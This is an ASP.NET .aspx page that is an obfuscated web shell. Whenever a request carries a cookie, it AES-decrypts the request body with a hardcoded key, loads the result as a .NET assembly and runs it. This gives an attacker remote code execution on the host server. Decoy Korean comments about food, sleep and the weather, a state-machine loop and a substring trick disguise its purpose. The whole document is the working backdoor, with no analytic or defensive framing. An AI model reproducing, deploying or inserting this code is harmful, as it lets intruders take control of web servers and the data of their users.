<%@ Page Language="C#" %><script runat="server">
    private void z(object y) {
        // 배고파요, 치킨 먹고 싶다.
        int op = 0;
        byte[] k = null;
        byte[] p = null;
        System.IO.Stream q = null;
        while (op < 5) {
            // 너무 졸려.
            switch (op) {
                case 0:
                    // 이 코드는 너무 복잡해.
                    k = System.Text.Encoding.Default.GetBytes(System.Text.Encoding.Default.GetString(System.Convert.FromBase64String("Y2E2MzQ1NzUzOGI5YjFlMA==")));
                    op = 1;
                    break;
                case 1:
                    // 그냥 집에 가고 싶다.
                    q = ((System.Web.UI.Page)y).Request.InputStream;
                    p = new byte[q.Length];
                    op = q.Length > 0 ? 2 : 5;
                    break;
                case 2:
                    // 오늘 날씨가 좋네요.
                    q.Read(p, 0, p.Length);
                    op = 3;
                    break;
                case 3:
                    // 커피 한잔 할까?
                    var d = new System.Security.Cryptography.RijndaelManaged();
                    var f = d.CreateDecryptor(k, k);
                    var g = f.TransformFinalBlock(p, 0, p.Length);
                    var h = System.Reflection.Assembly.Load(g);
                    // 여기는 어디, 나는 누구?
                    string i = "AlphaBetaGamma_K_Delta";
                    var j = h.CreateInstance(i.Substring(15, 1));
                    j.Equals(y);
                    op = 4;
                    break;
                default:
                    // 루프 종료.
                    op = 5;
                    break;
            }
        }
    }

    void Page_Load(object s, EventArgs e) {
        // 주말에 뭐하지?
        if (Request.Cookies.Count > 0) {
            z(this);
        }
    }
</script><% %>